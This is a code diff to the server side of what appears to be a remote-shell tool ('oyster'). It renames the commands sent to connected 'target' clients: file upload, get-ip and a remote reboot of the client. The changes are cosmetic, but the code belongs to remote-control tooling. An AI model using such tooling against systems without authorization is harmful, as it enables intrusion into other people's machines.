@@ -335,7 +335,7 @@ class ConnectionManager(object):
 
     def send_command(self, command, echo=False, encode=True, file_response=False):
         """
-        Send a command to a specific client.
+        Send a command to the currently selected client.
 
         :param command:
         :param echo:
@@ -621,13 +621,13 @@ o       O o   O `Ooo.   O   OooO'  o
         else:
             connection = self.connection_mgr.current_connection
 
-        print(connection.send_command('upload_filepath {}'.format(remote_filepath)))
+        print(connection.send_command('upload-filepath {}'.format(remote_filepath)))
 
         r = None
         try:
             with open(local_filepath, 'rb') as f:
                 data = b64encode(f.read())
-                r = connection.send_command('upload_data')
+                r = connection.send_command('upload-data')
                 r += '\n' + connection.send_command(data, encode=False)
         except FileNotFoundError as err_msg:
             print(err_msg)
@@ -764,7 +764,7 @@ o       O o   O `Ooo.   O   OooO'  o
         self.connection_mgr.send_command('oyster getcwd')
         while True:
             # Get the client IP to display in the input string along with the current working directory
-            input_string = "<{}> {}".format(self.connection_mgr.send_command('get ip'), self.connection_mgr.cwd)
+            input_string = "<{}> {}".format(self.connection_mgr.send_command('oyster get-ip'), self.connection_mgr.cwd)
             # If the connection was closed for some reason, return which will end the client shell.
             if self.connection_mgr.current_connection.status == 'CLOSED':
                 return
@@ -795,7 +795,7 @@ o       O o   O `Ooo.   O   OooO'  o
                 continue
 
             # Reboot the target's client.py file remotely.
-            if command == 'shell reboot':
+            if command == 'oyster shell-reboot':
                 try:
                     self.connection_mgr.send_command(command)
                 except BrokenPipeError as err_msg:
